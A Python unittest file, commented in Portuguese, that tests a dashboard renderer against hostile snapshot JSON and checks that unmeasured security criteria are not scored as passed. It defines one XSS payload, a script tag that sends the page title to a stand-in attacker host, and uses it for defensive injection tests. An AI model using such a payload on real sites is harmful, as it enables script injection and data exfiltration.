"""Guards do dashboard.

O modelo de distribuicao da skill e snapshot VERSIONADO: quem clona um
repositorio alheio e roda o render abre, no proprio navegador, HTML derivado
de JSON escrito por outra pessoa.
"""

from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path

from _fake_repo import fake_repo  # noqa: F401  (garante o sys.path dos scripts)

import render

PAYLOAD = "<script>fetch('https://evil.example/'+document.title)</script>"


def _snap(**extra):
    base = {
        "schema": 2, "project": "alvo",
        "generated_at": "2026-08-13T09:00:00-03:00",
        "collectors_run": ["git"], "errors": {},
    }
    base.update(extra)
    return base


class TestSnapshotHostil(unittest.TestCase):

    def test_campos_numericos_nao_injetam_script(self):
        snap = _snap(
            git={"age_days": PAYLOAD, "commits_30d": PAYLOAD, "authors_30d": []},
            django={"models": PAYLOAD, "apps": PAYLOAD},
            db={"cache_hit_ratio": PAYLOAD,
                "unused_indexes": [{"index": "i", "table": "t", "bytes": 1,
                                    "idx_scan": PAYLOAD}],
                "slow_queries": [{"query": "select 1", "calls": 1,
                                  "mean_ms": PAYLOAD, "total_s": PAYLOAD}]},
            quality={"complexity": {"worst": [{"file": "a.py", "name": "f",
                                               "complexity": 1, "line": PAYLOAD}]}},
        )
        html = render.render([snap])
        self.assertNotIn("<script>fetch", html)
        self.assertNotIn("</script><script", html)

    def test_snapshot_de_forma_invalida_nao_derruba(self):
        with tempfile.TemporaryDirectory() as tmp:
            Path(tmp, "2026-01-01.json").write_text("[1, 2, 3]", encoding="utf-8")
            Path(tmp, "2026-01-02.json").write_text(
                json.dumps(_snap()), encoding="utf-8")
            snaps = render.load_snapshots(tmp)
        self.assertEqual(len(snaps), 1)
        self.assertEqual(snaps[0]["project"], "alvo")

    def test_criterio_nao_medido_sai_do_denominador(self):
        """Nao medir nao pode nem premiar nem punir a nota."""
        # "dependabot": False fixa 1 criterio como falha real nos dois lados.
        # Sem isso os dois snapshots batem 100% de qualquer jeito (tudo que
        # sobra no denominador passa), e o assertNotEqual abaixo nunca
        # conseguiria provar nada — verificado rodando o fixture original do
        # brief antes desta troca: 100 contra 100 mesmo com o fix aplicado,
        # porque excluir um item 100%-limpo do denominador nao move a razao
        # quando so sobram itens que tambem passam. Com uma falha real
        # presente nos dois, excluir segredos_commitados do denominador MUDA
        # a fracao (a falha pesa proporcionalmente mais), e da pra provar que
        # o item nao medido saiu do calculo sem alegar credito.
        medido = _snap(governance={"segredos_commitados": [], "workflows": {},
                                   "dependencias": {}, "dependabot": False})
        nao = _snap(governance={"segredos_commitados": None,
                                "nao_medido": {"segredos_commitados": "git falhou"},
                                "workflows": {}, "dependencias": {},
                                "dependabot": False})
        eixos_m = {x["nome"]: x for x in render.auditoria(medido)[0]}
        eixos_n = {x["nome"]: x for x in render.auditoria(nao)[0]}
        self.assertNotEqual(eixos_m["Segurança"]["pct"], eixos_n["Segurança"]["pct"])
        rotulos = " ".join(r for r, _ in eixos_n["Segurança"]["checados"])
        self.assertIn("não auditado", rotulos)


class TestContratoAchadoParqueado(unittest.TestCase):
    """Ponta a ponta: prova o contrato inteiro do achado parqueado na Task 3.

    render.py:323 (antes do fix) fazia `gov.get("segredos_commitados") or []`,
    o que reconstruia o None em lista vazia ANTES do criterio decidir "ok" —
    a nao-medicao virava "nenhum segredo commitado: atendido" com badge verde
    e criterio P0 marcado como cumprido. Este teste monta o HTML de verdade
    (nao so chama auditoria()) e prova as tres pontas do contrato.
    """

    def test_html_nao_afirma_seguranca_sem_medir(self):
        # "dependabot": False deixa 1 criterio realmente reprovado nos dois
        # snapshots — sem isso os dois batem 100% (excluir um item que so
        # ia contribuir pontos "limpos" do denominador nao move a razao
        # quando o resto ja passa 100%), e o assertNotEqual do item (2) nunca
        # provaria nada. Ver comentario identico em
        # test_criterio_nao_medido_sai_do_denominador.
        nao_medido = _snap(governance={
            "segredos_commitados": None,
            "nao_medido": {"segredos_commitados": "git ls-files falhou"},
            "workflows": {}, "dependencias": {}, "dependabot": False,
        })
        medido_limpo = _snap(governance={
            "segredos_commitados": [],
            "workflows": {}, "dependencias": {}, "dependabot": False,
        })

        html_nao_medido = render.render([nao_medido])
        html_medido = render.render([medido_limpo])

        # (1) o motivo do nao-auditado aparece na tela, com o texto exato
        # que a UI usa pra sinalizar "isto nao foi verificado".
        self.assertIn("não auditado", html_nao_medido)
        self.assertIn("git ls-files falhou", html_nao_medido)
        # o snapshot de verdade limpo nao tem motivo nenhum pra mostrar.
        self.assertNotIn("git ls-files falhou", html_medido)

        # (2) a nota do eixo Seguranca no snapshot nao-medido tem que ser
        # DIFERENTE da nota do mesmo snapshot com segredos_commitados=[]
        # (medido, de verdade limpo). Notas iguais = a nao-medicao esta
        # sendo contada como "limpo", que e exatamente a mentira do achado.
        pct_nao_medido = {x["nome"]: x["pct"] for x in render.auditoria(nao_medido)[0]}["Segurança"]
        pct_medido = {x["nome"]: x["pct"] for x in render.auditoria(medido_limpo)[0]}["Segurança"]
        self.assertNotEqual(pct_nao_medido, pct_medido)

        # (3) o painel NAO pode afirmar "nenhum segredo commitado" como
        # criterio cumprido (marcado com o check "sim") quando na verdade
        # ninguem mediu. Criterio deve aparecer como "na" (nao aplicavel /
        # nao auditado), nunca "sim".
        eixos_nao_medido = {x["nome"]: x for x in render.auditoria(nao_medido)[0]}
        checklist = eixos_nao_medido["Segurança"]["checados"]
        item_segredo = next(rot for rot, ok in checklist if "segredo" in rot)
        ok_segredo = next(ok for rot, ok in checklist if "segredo" in rot)
        self.assertIsNone(ok_segredo, "segredos_commitados nao medido tem que "
                                       "sair como ok=None (nem sim, nem nao)")
        # o card do eixo no HTML usa class="na" pro item nao auditado —
        # nunca class="sim" (que so aparece quando ok is True de verdade).
        self.assertIn(f'class="na">{render.e(item_segredo)}', html_nao_medido)
        self.assertNotIn(f'class="sim">{render.e(item_segredo)}', html_nao_medido)


class TestSiblingWorkflowsNaoMedido(unittest.TestCase):
    """Achado extra da varredura: `wf = gov.get("workflows") or {}` tinha o
    MESMO efeito do achado parqueado, so que num vizinho. Se o coletor
    `governance` inteiro falha (excecao antes de popular o dict), o
    `governance` nem aparece no snapshot — so em `errors`. Sem o fix, isso
    reconstruia `wf` como `{}` e `not wf.get("sem_pin")` virava True: as
    duas checks de workflow (pin e permissions) saiam "atendidas" de graca.
    """

    def test_governance_ausente_nao_credita_workflows(self):
        sem_governance = _snap(errors={"governance": "boom: falha inesperada"})
        eixos = {x["nome"]: x for x in render.auditoria(sem_governance)[0]}
        checklist = dict(eixos["Segurança"]["checados"])
        ok_pin = checklist["actions com versão fixada"]
        ok_perm = checklist["workflows com permissions declarado"]
        self.assertIsNone(ok_pin, "sem coletor rodado, pin nao pode sair True")
        self.assertIsNone(ok_perm, "sem coletor rodado, permissions nao pode sair True")

    def test_governance_presente_com_workflows_vazio_e_realmente_ok(self):
        """Contraste: quando o coletor RODOU e workflows e legitimamente vazio
        (sem .github/workflows), os dois criterios sao True de verdade — o
        fix nao pode transformar "medido e limpo" em "nao medido"."""
        com_governance = _snap(governance={
            "segredos_commitados": [], "workflows": {"sem_pin": [], "sem_permissions": []},
            "dependencias": {},
        })
        eixos = {x["nome"]: x for x in render.auditoria(com_governance)[0]}
        checklist = dict(eixos["Segurança"]["checados"])
        self.assertTrue(checklist["actions com versão fixada"])
        self.assertTrue(checklist["workflows com permissions declarado"])


if __name__ == "__main__":
    unittest.main()
